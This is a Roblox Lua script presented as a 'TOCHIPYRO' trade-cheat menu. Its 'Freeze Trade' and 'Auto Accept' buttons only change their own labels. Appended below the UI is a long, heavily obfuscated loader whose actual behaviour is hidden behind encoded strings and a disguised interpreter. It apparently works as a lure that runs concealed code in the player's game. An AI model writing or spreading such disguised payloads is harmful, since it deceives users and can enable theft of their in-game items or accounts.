local Players = game:GetService("Players")
local player = Players.LocalPlayer
local rainbowSpeed = 0.5

-- Function to make rainbow text
local function updateRainbowColor(textLabel)
	local t = 0
	while textLabel and textLabel.Parent do
		local r = math.sin(t) * 127 + 128
		local g = math.sin(t + 2) * 127 + 128
		local b = math.sin(t + 4) * 127 + 128
		textLabel.TextColor3 = Color3.fromRGB(r, g, b)
		t = t + rainbowSpeed
		wait(0.1)
	end
end

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "TOCHIPYRO_UI"
screenGui.ResetOnSpawn = false

-- Main UI Frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 300, 0, 200)
mainFrame.Position = UDim2.new(0.5, -150, 0.4, 0)
mainFrame.BackgroundTransparency = 0.5
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Name = "MainUI"
mainFrame.ClipsDescendants = true

-- UICorner
local corner = Instance.new("UICorner", mainFrame)
corner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -30, 0, 30)
title.Position = UDim2.new(0, 5, 0, 5)
title.Text = "TOCHIPYRO Script"
title.TextScaled = true
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextColor3 = Color3.new(1,1,1)
task.spawn(function() updateRainbowColor(title) end)

-- Minimize Button
local minimizeBtn = Instance.new("TextButton", mainFrame)
minimizeBtn.Size = UDim2.new(0, 25, 0, 25)
minimizeBtn.Position = UDim2.new(1, -30, 0, 5)
minimizeBtn.Text = "_"
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.TextScaled = true
minimizeBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
minimizeBtn.TextColor3 = Color3.new(1,1,1)
local miniCorner = Instance.new("UICorner", minimizeBtn)
miniCorner.CornerRadius = UDim.new(1, 0)

-- Minimize logic
local minimized = false
minimizeBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	for _, child in ipairs(mainFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("TextLabel") then
			if child ~= title and child ~= minimizeBtn then
				child.Visible = not minimized
			end
		end
	end
end)

-- Buttons
local function createButton(text, posY)
	local btn = Instance.new("TextButton", mainFrame)
	btn.Size = UDim2.new(0.8, 0, 0, 30)
	btn.Position = UDim2.new(0.1, 0, 0, posY)
	btn.Text = text
	btn.Font = Enum.Font.GothamBold
	btn.TextScaled = true
	btn.BackgroundColor3 = Color3.fromRGB(70,70,70)
	btn.TextColor3 = Color3.new(1,1,1)
	local btnCorner = Instance.new("UICorner", btn)
	btnCorner.CornerRadius = UDim.new(1, 0)
	return btn
end

local tradeBtn = createButton("Open Trade Panel", 50)
local bypassBtn = createButton("Bypass", 90)
local closeBtn = createButton("Close UI", 130)

closeBtn.MouseButton1Click:Connect(function()
	mainFrame:Destroy()
end)

-- Trade Panel
local tradePanel = Instance.new("Frame", screenGui)
tradePanel.Size = UDim2.new(0, 300, 0, 220)
tradePanel.Position = UDim2.new(0.5, 160, 0.4, 0)
tradePanel.BackgroundTransparency = 0.5
tradePanel.BackgroundColor3 = Color3.fromRGB(90, 0, 150)
tradePanel.Visible = false
tradePanel.Active = true
tradePanel.Draggable = true
local tradeCorner = Instance.new("UICorner", tradePanel)
tradeCorner.CornerRadius = UDim.new(0, 12)

-- Trade Panel Title
local tradeTitle = Instance.new("TextLabel", tradePanel)
tradeTitle.Size = UDim2.new(1, 0, 0, 30)
tradeTitle.Position = UDim2.new(0, 0, 0, 5)
tradeTitle.Text = "Trade Panel"
tradeTitle.TextScaled = true
tradeTitle.BackgroundTransparency = 1
tradeTitle.Font = Enum.Font.GothamBold
tradeTitle.TextColor3 = Color3.new(1,1,1)
task.spawn(function() updateRainbowColor(tradeTitle) end)

-- Trade Panel Buttons
local freezeBtn = createButton("Freeze Trade", 50)
freezeBtn.Parent = tradePanel

local autoAcceptBtn = createButton("Auto Accept", 90)
autoAcceptBtn.Parent = tradePanel

local closeTradeBtn = createButton("Close Panel", 130)
closeTradeBtn.Parent = tradePanel

tradeBtn.MouseButton1Click:Connect(function()
	tradePanel.Visible = true
end)

closeTradeBtn.MouseButton1Click:Connect(function()
	tradePanel.Visible = false
end)

-- Toggle logic
local freezeOn = false
freezeBtn.MouseButton1Click:Connect(function()
	freezeOn = not freezeOn
	freezeBtn.Text = "Freeze Trade: " .. (freezeOn and "ON" or "OFF")
end)

local autoOn = false
autoAcceptBtn.MouseButton1Click:Connect(function()
	autoOn = not autoOn
	autoAcceptBtn.Text = "Auto Accept: " .. (autoOn and "ON" or "OFF")
end)

return(function(...)local g={"\054\055\119\076\054\083\078\052\084\109\068\061","\068\081\088\087\098\080\122\077";"\084\055\111\121","\047\070\078\087\084\081\086\061","\103\077\115\101\047\097\061\061";"\068\115\068\061";"\068\109\050\121\047\055\119\065","\070\057\119\077\103\112\061\061","\082\089\061\061";"\070\057\119\052\084\109\088\115\073\117\061\061";"\068\100\111\101\084\080\111\101\103\070\088\051\103\109\075\115","\068\109\111\065\084\081\047\115","\098\083\050\082\107\055\065\083\084\055\075\056\080\089\061\061";"\053\070\052\047\056\100\075\067\107\083\050\078\053\100\054\113","\080\079\078\100\088\104\050\069\106\109\122\065\097\079\078\083\047\107\103\061","\074\109\051\110\068\079\050\072\106\057\051\074\088\101\097\075","\047\109\075\043\084\081\086\061","\098\109\053\113\107\079\115\116\088\109\119\114\080\083\053\078","";"\088\055\051\090\098\076\053\051\098\070\086\076\103\079\051\056\103\109\103\061","\088\100\111\088\068\077\052\112\084\104\051\086\047\067\065\074","\054\080\122\112\103\080\053\120";"\106\074\068\057\106\079\089\087\054\077\053\099\056\109\057\098\098\097\061\061","\084\055\119\051\047\083\053\101\068\109\115\121\047\112\061\061","\084\109\053\082\103\067\122\048\073\080\065\122\080\079\115\057";"\047\081\053\057\103\089\061\061";"\047\111\097\075\047\057\049\076\098\104\078\100\084\080\052\056\047\101\068\061","\047\100\050\065\047\097\061\061";"\070\057\119\102\047\080\108\061","\068\074\075\113\054\057\111\108\073\109\050\113\088\104\053\100\107\097\061\061";"\070\057\119\065\047\070\088\051\054\055\050\114\084\055\074\061";"\080\083\115\049\107\109\097\108\082\074\102\075\107\117\061\061";"\084\080\050\101\098\117\061\061","\068\055\053\051\084\055\112\061","\100\113\110\049\111\079\048\079\115\110\106\069\100\070\122\049\075\100\121\108\099\083\057\097\088\083\121\118\088\111\072\070\071\113\048\098\088\080\072\051\121\088\122\084\088\048\051\101\054\068\068\108\116\116\102\084\076\049\100\073\118\085\087\119\115\086\077\067\068\117\069\106\072\050\083\122\082\120\073\066\106\117\121\083\082\097\081\108\112\117\050\078\086\102\071\090\107\090\067\070\106\049\110\061","\054\055\119\121\054\080\057\114\047\070\086\061","\054\055\050\114\084\055\074\061","\106\083\088\101\068\113\054\115\054\117\061\061","\103\100\051\051\068\089\061\061","\111\055\050\065\068\055\111\087\086\113\088\115\054\055\111\079\054\055\111\067\086\097\061\061";"\084\104\086\061","\103\100\119\121\103\100\050\101";"\047\100\057\051\054\055\053\110";"\084\104\113\061";"\082\114\089\115\047\072\110\052\082\089\061\061";"\106\101\111\121\088\101\065\081\047\101\078\121\047\057\115\081\098\077\068\061";"\047\081\115\113\056\115\089\061"}for Q,O in ipairs({{-1027204+1027205,25919-25872};{506641+-506640;-331774+331814};{-707694+707735;682095-682048}})do while O[-47643-(-47644)]<O[-719216+719218]do g[O[633357-633356]],g[O[-513437+513439]],O[-300347+300348],O[932166+-932164]=g[O[-515992+515994]],g[O[849856-849855]],O[918529+-918528]+(557736+-557735),O[287125+-287123]-(483579+-483578)end end local function Q(Q)return g[Q+(-457819-(-459387))]end do local Q=table.insert local O=math.floor local V=type local W=table.concat local c=string.char local t=string.len local a=string.sub local k=g local v={L=-267358-(-267409);["\049"]=295998-295997;g=966227-966203,["\053"]=-66412+66425,["\056"]=-458918-(-458930);j=8590+-8572;["\057"]=-161774+161827;W=494810-494760,["\047"]=-554463+554488;N=-781984+781993;["\048"]=260020+-260010,R=605442+-605428;r=939297-939263,o=40392-40371,v=734624+-734565;m=572271+-572233,n=-625968+626008;y=455032-454986;z=819096+-819039,I=-175387-(-175417);D=918450-918422,E=880927+-880916,b=336010+-335984,S=769156+-769149;Z=-786209-(-786267),k=817072+-817053;e=742189-742137,q=-578225+578229;h=-879527-(-879530),["\043"]=-645167-(-645214),F=-228341-(-228364);J=-545711+545731,K=85298-85249,l=-21883+21939;H=163168-163166,["\052"]=-536178+536219;u=483414-483414;B=184088-184026,X=-243591-(-243608),A=-137494+137539;i=82923-82892,U=752229+-752166,["\050"]=-893706-(-893711);["\051"]=345207-345174;T=-567433-(-567460),p=138713+-138665,["\055"]=638573-638567;M=-16489+16528,V=-624150-(-624158);w=295906-295845,d=-594546-(-594600),f=-246486+246530,Y=797764-797732;G=-199142+199202,a=136614+-136598,t=703347+-703305;O=271619-271584;x=569250+-569207;P=991416+-991394;["\054"]=303880+-303851,c=684536-684521;s=-207682-(-207719),C=871886+-871850;Q=264929+-264874}for g=944465+-944464,#k,529921+-529920 do local N=k[g]if V(N)=="\115\116\114\105\110\103"then local V=t(N)local d={}local F=544391+-544390 local e=484620+-484620 local m=313257-313257 while F<=V do local g=a(N,F,F)local W=v[g]if W then e=e+W*(-428405-(-428469))^((212769-212766)-m)m=m+(-662161+662162)if m==-774547-(-774551)then m=148386+-148386 local g=O(e/(317795+-252259))local V=O((e%(263169-197633))/(32555-32299))local W=e%(390612+-390356)Q(d,c(g,V,W))e=748852+-748852 end elseif g=="\061"then Q(d,c(O(e/(-132136+197672))))if F>=V or a(N,F+(285379+-285378),F+(-683266+683267))~="\061"then Q(d,c(O((e%(116588+-51052))/(-10625+10881))))end break end F=F+(-885989-(-885990))end k[g]=W(d)end end end return(function(g,V,W,c,t,a,k,m,j,d,L,N,F,X,v,e,y,O,G,D)y,d,O,D,j,e,N,F,G,v,m,X,L=function(g,Q)local V=e(Q)local W=function(...)return O(g,{...},Q,V)end return W end,function()F=(-617916+617917)+F N[F]=-63973+63974 return F end,function(O,W,c,t)local H,y,K,U,h,b,e,x,P,q,p,i,Z,u,C,B,Y,r,T,z,E,N,J,w,n,m,F,k,f,A,S,o,s,R while O do if O<-734684+8436935 then if O<-779339+3793822 then if O<2730355-818337 then if O<-1040534+2065972 then if O<450584+-63674 then if O<762871+-531948 then if O<-697835-(-782760)then B=J H=Q(125047+-126573)T=g[H]H=Q(-334567+333044)Z=T[H]T=Z(N,B)Z=v[c[1040229-1040223]]H=Z()P=T+H H=-717407+717408 x=P+E P=-801905-(-802161)i=x%P O=14135198-140805 P=e[F]E=i B=nil T=E+H Z=m[T]x=P..Z e[F]=x else w=O z=43637-43636 q=S[z]z=false s=q==z O=s and 14185391-1037299 or-1047321+3023644 r=s end else O=v[c[-266375-(-266382)]]O=O and-797469+5329693 or 3993373-546373 end else if O<197986-(-653319)then O=15267290-(-484488)else e=530908+-530763 O=12834091-1045953 F=v[c[-3073+3076]]N=F*e F=716712-716455 k=N%F v[c[225096-225093]]=k end end else if O<-82164+1551556 then if O<-519998+1678845 then O=g[Q(-979904+978352)]k={}else F=v[c[-426025+426027]]O=5196019-(-390130)e=v[c[-46660+46663]]N=F==e k=N end else if O<158893+1422817 then O=true v[c[179810+-179809]]=O O=g[Q(106405-107950)]k={}else O=2870665-93520 i=Q(-828008-(-826470))p=g[i]i=Q(-272791-(-271238))h=p[i]f=h end end end else if O<2956770-441961 then if O<-756583+2756960 then if O<2011016-12032 then if O<966970+980179 then O=G(10199282-(-3390),{m})T={O()}O=g[Q(-283193-(-281636))]k={V(T)}else k=r O=w O=-209317+8200561 end else O=13191225-(-576394)end else if O<3121025-731326 then u=Q(-573133+571599)O=g[u]u=Q(200943-202474)g[u]=O O=10135066-931619 else A=Q(544598-546140)B=Q(-530503-(-528965))E=k k=g[A]A=Q(-221242+219721)O=k[A]A=d()v[A]=O p=Q(-182676-(-181138))k=g[B]B=Q(619404+-620937)O=k[B]h=g[p]J=O f=h B=O O=h and 758328+1135228 or 3473865-696720 end end else if O<1003020+1753285 then if O<-961513+3688720 then O=true O=-319957+2254201 else O=true O=O and-249151+880297 or 1737858-(-196386)end else if O<48460+2895506 then k=f O=J O=f and-907951+17468485 or-226378+11206935 else N=W[919571+-919570]O=v[c[812352+-812351]]F=W[-604191-(-604193)]e=O O=e[F]O=O and 48489+15219423 or 4739002-610255 end end end end else if O<5614043-750897 then if O<150389+3553290 then if O<-105874+3322273 then if O<953878+2196928 then if O<-197142+3320589 then O=true O=O and 14852144-51878 or-774099+7378269 else F=v[c[-692162+692163]]y=491050+-491048 m=-1000799-(-1000800)e=F(m,y)F=-165146-(-165147)N=e==F O=N and 6392292-806143 or 898857-(-512778)k=N end else k=481756+5122492 e=652185+6650552 F=Q(-739352-(-737824))N=F^e O=k-N k=Q(-972463+970901)N=O O=k/N k={O}O=g[Q(600528-602078)]end else if O<747428+2661440 then R=d()Y=-725080-(-725180)n=Q(-501239-(-499697))v[R]=Z U=119679-119424 k=g[n]b=481090-481090 n=Q(275272-276793)O=k[n]n=-571549-(-571550)k=O(n,Y)Y=-347367+347367 n=d()v[n]=k O=v[A]k=O(Y,U)U=2247+-2246 Y=d()v[Y]=k O=v[A]s=Q(922878-924405)C=v[n]k=O(U,C)K=200872+-200871 U=d()v[U]=k k=v[A]S=1028428-1028426 C=k(K,S)k=-389538+389539 O=C==k C=d()k=Q(829989+-831519)v[C]=O O=Q(-63502-(-61953))w=g[s]o=512152+-502152 S=Q(-755071-(-753505))q=v[A]O=x[O]z={q(b,o)}s=w(V(z))w=Q(-571656+570090)r=s..w K=S..r O=O(x,k,K)S=Q(-193378+191837)K=d()v[K]=O r=L(-291800+3424670,{A,R,J,e;F;P;C;K;n,U;Y,f})k=g[S]S={k(r)}O={V(S)}S=O O=v[C]O=O and 294538+13264383 or-784032+13141999 else e=v[c[-126061-(-126070)]]O={}N=O F=548782+-548781 m=e e=348140-348139 y=e O=8703396-(-201939)e=-1029291+1029291 E=y<e e=F-y end end else if O<4765701-280136 then if O<-52042+4240542 then O={}y=-252251+35184372341083 v[c[539313-539311]]=O k=v[c[-673320-(-673323)]]J=352842-352841 m=k k=F%y B=Q(-545967+544441)A=-183325+183580 v[c[555688-555684]]=k E=F%A O=-931203+14925596 h=J A=773142+-773140 y=E+A v[c[846600+-846595]]=y A=g[B]B=Q(-6365-(-4840))E=A[B]A=E(N)J=-380450+380450 p=h<J E=Q(-895550-(-893994))e[F]=E E=-105597-(-105716)B=-537898+537899 J=B-h f=A else O=-746602+12654875 m=nil A=nil E=nil end else if O<4943894-219366 then N=Q(427322-428846)e=704799+-704799 O=g[N]F=v[c[-524690-(-524698)]]N=O(F,e)O=3993671-546671 else f=j(604402+2556748,{})k=Q(264777+-266316)B=Q(-848840+847299)O=g[k]N=v[c[721488+-721484]]m=Q(-465132-(-463605))e=g[m]A=g[B]B={A(f)}A=-651013+651015 E={V(B)}y=E[A]m=e(y)e=Q(449454+-450984)F=N(m,e)N={F()}k=O(V(N))N=k F=v[c[653183-653178]]k=F O=F and 602234+12262285 or 9340652-719797 end end end else if O<6609551-729299 then if O<4623576-(-1020237)then if O<4914467-(-586773)then if O<-199491+5286373 then O=v[c[956377+-956367]]F=v[c[-699823-(-699834)]]N[O]=F O=v[c[-365236+365248]]F={O(N)}k={V(F)}O=g[Q(257558+-259106)]else e=Q(-583839+582313)O=true F=d()y=d()N=W v[F]=O k=g[e]e=Q(771649-773181)O=k[e]e=d()B=G(1084782-(-463837),{y})v[e]=O O=L(8252970-848,{})m=d()v[m]=O A=Q(918482-920023)O=false v[y]=O E=g[A]A=E(B)O=A and 14978569-626351 or-124380+2560575 k=A end else O=k and 4375324-(-424082)or 74797+284022 end else if O<5264289-(-484932)then e=-294752+294877 F=v[c[873886-873884]]N=F*e F=706759+6660910023510 k=N+F N=-526368+35184372615200 O=k%N v[c[-860217+860219]]=O F=661209-661208 O=-475236+1474260 N=v[c[-196944+196947]]k=N~=F else x=P O=619609+12079180 Y=x i[x]=Y x=nil end end else if O<7310178-576007 then if O<7414436-821042 then H=12565-12564 u=-187060+187066 O=v[A]T=O(H,u)O=Q(235357-236891)g[O]=T u=Q(-64542-(-63008))H=g[u]u=726664+-726662 O=H>u O=O and 9260929-(-544968)or 520892+1524939 else O=g[Q(96494-98048)]k={}end else if O<7532617-(-77831)then s=-92993+92994 O=9886374-650979 w=S[s]r=w else F=Q(113094-114616)k=-158332+9988328 e=14406188-(-961615)N=F^e O=k-N k=Q(-443472-(-441929))N=O O=k/N k={O}O=g[Q(-1004547-(-1003018))]end end end end end else if O<11475643-(-741612)then if O<8941499-(-843384)then if O<9579176-650411 then if O<902418+7389793 then if O<7666529-(-390979)then if O<-527206+8461016 then B=-16857+16857 F=e f=468190+-467935 O=v[c[720476+-720475]]A=O(B,f)N[F]=A F=nil O=9783991-878656 else O=14948631-(-514491)v[F]=k end else k=Q(-319750+318226)N=Q(-228836+227301)O=g[k]k=O(N)k={}O=g[Q(-1039692+1038131)]end else if O<8074958-(-654183)then O=492667-133848 N=nil v[c[-452313+452318]]=k else e=e+y A=not E F=e<=m F=A and F A=e>=m A=E and A F=A or F A=8866889-972518 O=F and A F=5049081-105240 O=O or F end end else if O<-360110+9571693 then if O<575739+8482956 then e=78662-78630 F=v[c[-188273-(-188276)]]f=-356728+356730 h=-728940-(-728953)N=F%e m=v[c[1035385-1035381]]A=v[c[328509+-328507]]x=v[c[-715865-(-715868)]]i=x-N x=475972+-475940 p=i/x J=h-p B=f^J E=A/B y=m(E)m=-933263+4295900559 e=y%m y=-943404-(-943406)m=y^N F=e/m m=v[c[-474504+474508]]B=118077+-118076 A=F%B B=422568+4294544728 E=A*B N=nil y=m(E)O=15928112-(-682124)m=v[c[449261+-449257]]E=m(F)e=y+E h=-556993+557249 y=427132+-361596 f=328745+-328489 A=547620-482084 m=e%y E=e-m e=nil y=E/A A=-634337-(-634593)E=m%A B=m-E A=B/f f=-935928+936184 B=y%f J=y-B y=nil f=J/h J={E;A,B;f}v[c[-574563+574564]]=J m=nil E=nil B=nil F=nil f=nil A=nil else O=15563349-(-188429)end else if O<9705512-206930 then v[F]=r z=v[U]b=448721-448720 q=z+b s=S[q]w=h+s s=556510-556254 O=w%s q=v[Y]h=O s=p+q q=-196749-(-197005)O=14909122-(-554000)w=s%q p=w else Z=Z+H k=Z<=T R=not u k=R and k R=Z>=T R=u and R k=R or k R=3861508-536922 O=k and R k=-245696+16508966 O=O or k end end end else if O<-325255+10961201 then if O<11116917-914894 then if O<-314757+10461676 then if O<565376+9238931 then u=-526172+526172 P=#i x=P==u O=x and 10352663-154211 or 11734289-(-629737)else H=Q(821657+-823184)R=Q(735068-736599)O=g[H]u=g[R]H=O(u)O=Q(976336-977870)g[O]=H O=9980795-777348 end else C=Q(530702+-532267)S=Q(382337+-383881)P=d()i=nil m=nil k={}B=nil n=Q(-705448-(-703884))R=d()x={}Y={}v[P]=x x=d()u=j(14980351-225791,{P,f;J,y})A=nil v[x]=u u={}v[R]=u u=g[n]A=Q(220367+-221914)y=D(y)s=nil K=v[R]U={[C]=K;[S]=s}n=u(Y,U)y=Q(6115+-7666)e=n m=g[y]E=nil h=nil u=j(2774824-(-234315),{R;P,p;f;J,x})E=g[A]P=D(P)x=D(x)R=D(R)O=g[Q(-35979+34424)]h=1041604+9375737277513 p=D(p)J=D(J)J=Q(-91819+90279)f=D(f)F=u f=F(J,h)B=e[f]f=Q(240244+-241781)F=nil f=E[f]A={f(E,B)}y=m(V(A))e=nil m=y()end else if O<9461333-(-854691)then O=2570963-(-534556)else O=-14469+10897662 T=h==p Z=T end end else if O<10464158-(-714438)then if O<10370064-(-531887)then v[F]=Z O=v[F]O=O and 882617+1117730 or 3148179-422882 else J=Q(186701-188254)f=g[J]O=434770+16125764 k=f end else if O<390683+11508166 then e=995939+-995938 F=v[c[-765539+765542]]N=F~=e O=N and 9527050-546423 or-439180+1438204 else O=g[Q(-122681-(-121121))]k={F}end end end end else if O<-262966+14977565 then if O<32717+13477380 then if O<13779169-958034 then if O<670496+11794562 then if O<12506968-145360 then w=v[F]r=w O=w and 7355432-(-80760)or 9217605-(-17790)else u=#i O=-259291+10054246 P=664167+-664166 x=m(P,u)P=E(i,x)Y=-315800+315801 u=v[p]n=P-Y R=A(n)x=nil u[P]=R P=nil end else P=P+R x=P<=u Y=not n x=Y and x Y=P>=u Y=n and Y x=Y or x Y=-70927+5857942 O=x and Y x=537858+15296086 O=O or x end else if O<13693320-817995 then e=v[c[300631-300625]]F=e==N O=-527903+9148758 k=F else z=-690927-(-690929)q=S[z]z=v[K]s=q==z r=s O=876370+1099953 end end else if O<-866082+14827804 then if O<-415257+14037502 then r=v[F]O=r and-297254-(-383461)or 8338218-346974 k=r else m=D(m)x=nil A=D(A)i=nil y=D(y)E=nil f=D(f)B=nil i={}p=nil B=Q(46899-48437)e=D(e)h=nil F=D(F)e=nil F=nil A=Q(-1034906-(-1033364))J=D(J)E=Q(-129865-(-128323))h={}P=D(P)y=g[E]x=214310+-214309 E=Q(165458+-167016)m=y[E]J=d()y=d()v[y]=m f=Q(-754121+752595)E=g[A]A=Q(133314-134835)m=E[A]A=g[B]B=Q(40683+-42246)E=A[B]B=g[f]f=Q(283468-285004)A=B[f]f=d()B=-46330-(-46330)P=205805-205549 v[f]=B B=520544-520542 v[J]=B p=d()B={}u=P v[p]=h O=13026925-328136 P=493354+-493353 R=P h=-681016+681016 P=857753-857753 n=R<P P=x-R end else if O<13977849-(-173598)then i=not p J=J+h B=J<=f B=i and B i=J>=f i=p and i B=i or B i=703911+-653591 O=B and i B=-172366+4450077 O=O or B else E=v[y]O=-358244+2794439 k=E end end end else if O<15121378-(-668649)then if O<14372045-(-985599)then if O<14964318-(-31250)then if O<14468311-(-294396)then N=v[c[-827357-(-827358)]]k=#N N=-804823+804823 O=k==N O=O and 4731396-(-958814)or 450293+16159943 else k=Q(772484-774018)N=Q(201777+-203308)O=g[k]k=g[N]N=Q(1014844+-1016375)g[N]=O N=Q(-462780+461246)g[N]=k N=v[c[580436+-580435]]O=3964713-859194 F=N()end else O=11374925-(-533348)end else if O<-304618+15810104 then K=D(K)U=D(U)n=D(n)Y=D(Y)C=D(C)O=8975772-(-642549)S=nil R=D(R)else O=true O=O and 5717235-(-380692)or 782320-(-262410)end end else if O<16244983-(-125482)then if O<-516258+16560320 then P=#i O=769162+11594864 u=-214221-(-214221)x=P==u else T=v[F]O=T and 217278+10379900 or 11861947-978754 Z=T end else if O<15628137-(-945095)then i=Q(911680-913221)x=X(8337418-656734,{})J=897323-897320 H=Q(323817-325344)f=d()v[f]=k h=469719-469654 O=v[A]k=O(J,h)J=d()O=-1045567+1045567 h=O v[J]=k O=460372+-460372 k=g[i]p=O i={k(x)}O={V(i)}i=O k=471677+-471675 O=i[k]k=Q(-268084+266545)x=O O=g[k]P=v[e]T=g[H]H=T(x)T=Q(797003+-798533)Z=P(H,T)P={Z()}k=O(V(P))P=d()v[P]=k Z=v[J]k=-3042+3043 T=Z O=50707+9567614 Z=-81328-(-81329)H=Z Z=-939332+939332 u=H<Z Z=k-H else e=Q(595132+-596670)O=g[Q(438460+-440019)]F=g[e]e=Q(-67238+65675)N=F[e]e=v[c[168821+-168820]]F={N(e)}k={V(F)}end end end end end end end O=#t return V(k)end,function(g)N[g]=N[g]-(-799664+799665)if N[g]==906235-906235 then N[g],v[g]=nil,nil end end,function(g,Q)local V=e(Q)local W=function(W,c,t,a,k)return O(g,{W;c,t,a,k},Q,V)end return W end,function(g)for Q=767363-767362,#g,-139261-(-139262)do N[g[Q]]=N[g[Q]]+(146184+-146183)end if W then local O=W(true)local V=t(O)V[Q(-465255-(-463690))],V[Q(699613-701180)],V[Q(-981193+979647)]=g,m,function()return-1290927-1047677 end return O else return c({},{[Q(653759+-655326)]=m,[Q(20747-22312)]=g,[Q(-54642+53096)]=function()return 235111+-2573715 end})end end,{},-138356+138356,function(g,Q)local V=e(Q)local W=function(W)return O(g,{W},Q,V)end return W end,{},function(g)local Q,O=-798018-(-798019),g[-985299+985300]while O do N[O],Q=N[O]-(-513816+513817),Q+(525623-525622)if N[O]==1005128+-1005128 then N[O],v[O]=nil,nil end O=g[Q]end end,function(g,Q)local V=e(Q)local W=function(W,c)return O(g,{W,c},Q,V)end return W end,function(g,Q)local V=e(Q)local W=function(W,c,t)return O(g,{W;c;t},Q,V)end return W end return(y(5334239-33518,{}))(V(k))end)(getfenv and getfenv()or _ENV,unpack or table[Q(412621+-414174)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
